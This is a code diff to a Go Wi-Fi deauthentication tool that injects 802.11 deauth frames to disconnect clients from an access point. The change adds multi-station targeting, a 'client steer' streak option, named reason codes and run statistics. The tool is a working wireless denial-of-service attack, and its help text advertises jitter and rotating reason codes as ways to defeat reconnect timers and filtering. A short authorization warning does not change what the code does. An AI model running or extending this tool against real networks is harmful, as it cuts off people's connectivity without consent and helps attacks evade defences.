@@ -49,19 +49,21 @@ const version = "16.14"
 
 func main() {
 	var (
-		ifaceArg = flag.String("i", "", "wireless interface in monitor mode (e.g. wlan0mon)")
-		bssidArg = flag.String("a", "", "access point BSSID (router MAC), e.g. 00:0c:41:63:45:6a")
-		staArg   = flag.String("s", "", "station MAC to disconnect (ff:ff:ff:ff:ff:ff = every client on the BSSID)")
-		reason   = flag.Int("reason", 7, "802.11 deauth reason code (7 = STA leaving BSS)")
-		count    = flag.Int("count", 64, "frames sent per burst (1-256)")
-		delay    = flag.Int("delay", 5, "seconds between bursts (repeat kicks a client that reconnects)")
-		once     = flag.Bool("once", false, "send a single burst and exit")
-		duration = flag.Int("duration", 0, "auto-stop after N seconds (0 = until interrupt)")
-		jitter   = flag.Int("jitter", 2, "random 0-N ms delay before each frame (irregular timing defeats reconnect timers)")
-		mix      = flag.Bool("mix-reasons", true, "rotate the deauth reason code each burst")
-		hop      = flag.Bool("hop", false, "hop the adapter between channels after each burst")
-		channels = flag.String("channels", "1,6,11", "comma-separated channel list used with --hop")
+		ifaceArg  = flag.String("i", "", "wireless interface in monitor mode (e.g. wlan0mon)")
+		bssidArg  = flag.String("a", "", "access point BSSID (router MAC), e.g. 00:0c:41:63:45:6a")
+		staArg    = flag.String("s", "", "station MAC(s), comma-separated (ff:ff:ff:ff:ff:ff = all clients)")
+		reasonArg = flag.String("reason", "7", "deauth reason: code 0-65535 or preset name (default 7 = leaving)")
+		streak    = flag.Int("streak", 1, "bursts per station before switching to the next (client steer)")
+		count     = flag.Int("count", 64, "frames sent per burst (1-256)")
+		delay     = flag.Int("delay", 5, "seconds between bursts (repeat kicks a client that reconnects)")
+		once      = flag.Bool("once", false, "send a single burst and exit")
+		duration  = flag.Int("duration", 0, "auto-stop after N seconds (0 = until interrupt)")
+		jitter    = flag.Int("jitter", 2, "random 0-N ms delay before each frame (irregular timing defeats reconnect timers)")
+		mix       = flag.Bool("mix-reasons", true, "rotate the deauth reason code each burst")
+		hop       = flag.Bool("hop", false, "hop the adapter between channels after each burst")
+		channels  = flag.String("channels", "1,6,11", "comma-separated channel list used with --hop")
 
+		listReasons = flag.Bool("list-reasons", false, "list named deauth reasons and exit")
 		force       = flag.Bool("force", false, "skip interactive confirmations (require explicit flags)")
 		noBanner    = flag.Bool("no-banner", false, "skip the banner")
 		quiet       = flag.Bool("q", false, "quiet: results only")
@@ -72,7 +74,7 @@ func main() {
 	)
 	flag.StringVar(ifaceArg, "interface", "", "wireless interface in monitor mode (e.g. wlan0mon)")
 	flag.StringVar(bssidArg, "ap", "", "access point BSSID (router MAC), e.g. 00:0c:41:63:45:6a")
-	flag.StringVar(staArg, "station", "", "station MAC to disconnect (ff:ff:ff:ff:ff:ff = every client on the BSSID)")
+	flag.StringVar(staArg, "station", "", "station MAC(s), comma-separated (ff:ff:ff:ff:ff:ff = all clients)")
 	flag.BoolVar(noBanner, "minimal", false, "skip the banner (alias: --no-banner)")
 	flag.BoolVar(quiet, "quiet", false, "quiet: results only")
 	flag.IntVar(jitter, "jitter-ms", 2, "random 0-N ms delay before each frame")
@@ -84,6 +86,10 @@ func main() {
 
 	if *showVer {
 		fmt.Printf("GNULTE-WIFI v%s (Go)\n", version)
+		return
+	}
+	if *listReasons {
+		printReasons()
 		return
 	}
 	if *showDocs {
@@ -162,6 +168,10 @@ func main() {
 	if explicitReason {
 		*mix = false
 	}
+	reasonCode, _, err := airframes.ParseReason(*reasonArg)
+	if err != nil {
+		fatal(fmt.Errorf("--reason: %v", err))
+	}
 	if !*noBanner && !*quiet && os.Getenv("GNULTE_AS_ROOT") != "1" {
 		banner()
 	}
@@ -208,12 +218,12 @@ func main() {
 	if err != nil {
 		fatal(fmt.Errorf("-a: %v", err))
 	}
-	station, err := airframes.ParseMAC(*staArg)
+	stations, err := ParseStations(*staArg)
 	if err != nil {
 		fatal(fmt.Errorf("-s: %v", err))
 	}
-	if *reason < 0 || *reason > 65535 {
-		fatal(fmt.Errorf("reason code must be 0-65535 (got %d)", *reason))
+	if *streak < 1 {
+		*streak = 1
 	}
 	if *count < 1 {
 		*count = 1
@@ -255,7 +265,7 @@ func main() {
 	}
 
 	if !*quiet {
-		summary(bssid, station, *ifaceArg, *count, *delay, *once, *duration, *reason, *jitter, *mix, *hop, hopChannels)
+		summary(bssid, stations, *ifaceArg, *count, *delay, *streak, *once, *duration, int(reasonCode), *jitter, *mix, *hop, hopChannels)
 	}
 	if !*force {
 		if !stdinIsTTY() {
@@ -284,7 +294,7 @@ func main() {
 	defer inj.Close()
 
 	if !*quiet {
-		fmt.Println("  " + okText("Injecting deauth frames — "+stationLabel(station)))
+		fmt.Println("  " + okText("Injecting deauth frames — "+formatStations(stations)))
 		extras := ""
 		if *jitter > 0 {
 			extras += fmt.Sprintf(", jitter ≤%dms", *jitter)
@@ -299,7 +309,7 @@ func main() {
 		fmt.Println()
 	}
 
-	reasons := []uint16{uint16(*reason)}
+	reasons := []uint16{reasonCode}
 	if *mix {
 		reasons = airframes.ReasonCodes()
 	}
@@ -308,8 +318,16 @@ func main() {
 		rng = rand.New(rand.NewSource(time.Now().UnixNano()))
 		sent,
 		bursts uint64
-		chIdx int
+		chIdx      int
+		jstats     JitterStats
+		dstats     DwellStats
+		stayBursts int
+		curChannel uint8
+		dwellStart = time.Now()
 	)
+	if *hop && len(hopChannels) > 0 {
+		curChannel = hopChannels[0]
+	}
 loop:
 	for {
 		select {
@@ -318,15 +336,20 @@ loop:
 		default:
 		}
 		rc := reasons[bursts%uint64(len(reasons))]
+		station := stationForBurst(stations, int(bursts), *streak)
+		stayBursts++
 		for i := 0; i < *count; i++ {
 			select {
 			case <-sigCtx.Done():
 				break loop
 			default:
 			}
+			ms := 0
 			if *jitter > 0 {
-				time.Sleep(time.Duration(rng.Intn(*jitter+1)) * time.Millisecond)
+				ms = rng.Intn(*jitter + 1)
+				time.Sleep(time.Duration(ms) * time.Millisecond)
 			}
+			jstats.Add(ms)
 			f := airframes.DeauthFrame(bssid, station, rc, seq)
 			seq = (seq + 1) & 0x0fff
 			if err := inj.Send(f); err != nil {
@@ -336,7 +359,7 @@ loop:
 		}
 		sentFlag := ""
 		if *mix && len(reasons) > 1 {
-			sentFlag = fmt.Sprintf(" (reason %d)", rc)
+			sentFlag = " (" + airframes.FormatReason(rc) + ")"
 		}
 		bursts++
 		if !*quiet {
@@ -352,11 +375,14 @@ loop:
 		}
 		// Channel-hopping follows the burst: jump the adapter before the next
 		// round so a channel-hopping AP or a station that left the channel can
-		// still be reached.
+		// still be reached. The interval just spent on curChannel is its dwell.
 		if *hop {
-			next := hopChannels[chIdx%len(hopChannels)]
+			dstats.Record(curChannel, stayBursts, time.Since(dwellStart))
+			stayBursts = 0
 			chIdx++
-			if err := airframes.SetChannel(*ifaceArg, next); err != nil {
+			curChannel = hopChannels[chIdx%len(hopChannels)]
+			dwellStart = time.Now()
+			if err := airframes.SetChannel(*ifaceArg, curChannel); err != nil {
 				fatal(fmt.Errorf("channel hop: %v", err))
 			}
 		}
@@ -365,6 +391,9 @@ loop:
 			break loop
 		case <-time.After(time.Duration(*delay) * time.Second):
 		}
+	}
+	if *hop && len(hopChannels) > 0 {
+		dstats.Record(curChannel, stayBursts, time.Since(dwellStart))
 	}
 
 	// The burst loop is done; hand Ctrl+C back to the shell so a second press
@@ -376,15 +405,36 @@ loop:
 		fmt.Println()
 	}
 	fmt.Printf("  %s sent %d deauth frame(s) in %d burst(s) → %s\n",
-		okText(""), sent, bursts, station)
+		okText(""), sent, bursts, formatStations(stations))
+	if *jitter > 0 {
+		fmt.Printf("  Jitter   : %s\n", jstats.String())
+	}
+	if *hop {
+		fmt.Printf("  Dwell    : %s\n", FormatDwell(dstats.Rows()))
+	}
 	fmt.Println("\nTest finished — connectivity is normal; the station associates again on its own.")
 }
 
-func stationLabel(s airframes.MAC) string {
-	if s.IsBroadcast() {
-		return "broadcast — every client on the BSSID"
+// formatStations renders a target list on one line for notices and totals.
+func formatStations(stations []airframes.MAC) string {
+	parts := make([]string, 0, len(stations))
+	for _, s := range stations {
+		if s.IsBroadcast() {
+			parts = append(parts, "broadcast (all clients)")
+		} else {
+			parts = append(parts, s.String())
+		}
 	}
-	return "single station " + s.String()
+	return strings.Join(parts, ", ")
+}
+
+// printReasons lists the preset names accepted by --reason.
+func printReasons() {
+	fmt.Println("Named deauth reasons (pass the name or its number to --reason):")
+	for _, r := range airframes.ReasonPresets() {
+		fmt.Printf("  %-18s %3d  %s\n", r.Name, r.Code, r.Desc)
+	}
+	fmt.Println("  Any code from 0 to 65535 is also accepted; unnamed codes are sent as-is.")
 }
 
 // Extra annotation shown beside the per-burst counter line.
@@ -406,7 +456,7 @@ func hopLabel(chans []uint8, idx int) string {
 }
 
 // summary prints the pre-test confirmation box (mirrors gnulte's CONFIRM TEST).
-func summary(bssid, station airframes.MAC, iface string, count, delay int, once bool, duration, reason, jitter int, mix, hop bool, hopCh []uint8) {
+func summary(bssid airframes.MAC, stations []airframes.MAC, iface string, count, delay, streak int, once bool, duration, reason, jitter int, mix, hop bool, hopCh []uint8) {
 	repeat := fmt.Sprintf("every %d s until interrupted", delay)
 	if once {
 		repeat = "single burst"
@@ -417,9 +467,12 @@ func summary(bssid, station airframes.MAC, iface string, count, delay int, once 
 	fmt.Println("                CONFIRM DEAUTH TEST")
 	fmt.Println("══════════════════════════════════════════════════")
 	fmt.Printf("  Access point : %s\n", ux.C(ux.Target, bssid.String()))
-	fmt.Printf("  Station      : %s\n", ux.C(ux.Target, stationLabel(station)))
+	fmt.Printf("  Station(s)   : %s\n", ux.C(ux.Target, formatStations(stations)))
+	if len(stations) > 1 {
+		fmt.Printf("  Client steer : %d burst(s) per station, then switch\n", streak)
+	}
 	fmt.Printf("  Interface    : %s (monitor mode)\n", ux.C(ux.Cyan, iface))
-	fmt.Printf("  Deauth reason: %d\n", reason)
+	fmt.Printf("  Deauth reason: %s\n", airframes.FormatReason(uint16(reason)))
 	if mix {
 		fmt.Printf("  Reason mix   : rotate per burst (%d reasons)\n", len(airframes.ReasonCodes()))
 	}
@@ -435,8 +488,12 @@ func summary(bssid, station airframes.MAC, iface string, count, delay int, once 
 		}
 		fmt.Printf("  Channel hop  : %s\n", strings.Join(chs, " → "))
 	}
-	fmt.Println("  Warning      : this disconnects the station from its router")
-	fmt.Println("                 and stops its Wi-Fi until it reconnects.")
+	target := "the station from its router"
+	if len(stations) > 1 {
+		target = "these stations from their router"
+	}
+	fmt.Println("  Warning      : this disconnects " + target)
+	fmt.Println("                 and stops Wi-Fi until each one reconnects.")
 	fmt.Println("  Use only where you are authorized and the activity is lawful.")
 	fmt.Println("══════════════════════════════════════════════════")
 	fmt.Println()
@@ -527,8 +584,13 @@ Usage:
 Options:
   -i, --interface IFACE   wireless interface in monitor mode (e.g. wlan0mon)
   -a, --ap MAC            access point BSSID (the router's MAC)
-  -s, --station MAC       station to disconnect; ff:ff:ff:ff:ff:ff = all clients
-      --reason CODE       deauth reason code (default 7 = STA leaving BSS)
+  -s, --station MAC[,...] station(s) to disconnect, comma-separated;
+                          ff:ff:ff:ff:ff:ff = all clients on the BSSID
+      --reason CODE|NAME  deauth reason: number 0-65535 or a preset name
+                          (default 7 = leaving); see --list-reasons
+      --list-reasons      list the named reasons and exit
+      --streak N          bursts per station before switching to the next,
+                          for client steering (default 1)
       --count N           frames per burst, 1-256 (default 64)
       --delay SECONDS     seconds between bursts (default 5)
       --jitter-ms N       random 0-N ms delay before each frame (defeats
@@ -554,5 +616,9 @@ type monitor). Some adapters cap injection rates; raise --count if a single
 frame rarely lands. Mixing reason codes and adding jitter make the deauths
 progressively harder to filter or recover from — the station keeps dropping
 its association while it tries to rejoin, on networks you own.
+
+With several stations, --streak sends N bursts to each in turn before moving
+on. The closing summary counts the jitter applied per frame and, with --hop,
+the time spent on each channel.
 `, version)
 }
